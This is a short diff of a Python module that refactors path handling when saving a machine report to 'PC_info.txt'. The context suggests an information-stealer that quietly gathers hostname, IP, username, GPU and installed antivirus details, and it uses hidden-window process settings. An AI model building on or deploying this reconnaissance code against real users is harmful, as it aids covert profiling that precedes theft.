@@ -3,7 +3,7 @@ from GPUtil import getGPUs
 from socket import gethostbyname, gethostname
 from platform import uname,processor
 from os import getlogin, makedirs, environ
-from os.path import exists
+from os.path import exists, join
 from time import asctime
 from requests import get
 from subprocess import check_output, PIPE, STARTUPINFO, STARTF_USESHOWWINDOW
@@ -239,9 +239,9 @@ Antiviruses: {', '.join(Antiviruses)}
 
     try:
         user = environ['USERPROFILE']
-        pathToLogs = f'{config.pathToLogs}\\System'
+        pathToLogs = join(config.pathToLogs, "System")
         makedirs(pathToLogs, exist_ok=True)
-        file = open(f'{pathToLogs}\\PC_info.txt', "w+", encoding='utf-8')
+        file = open(join(pathToLogs, "PC_info.txt"), "w+", encoding='utf-8')
         file.write(systeminfo)
         file.close()
     except Exception as e:
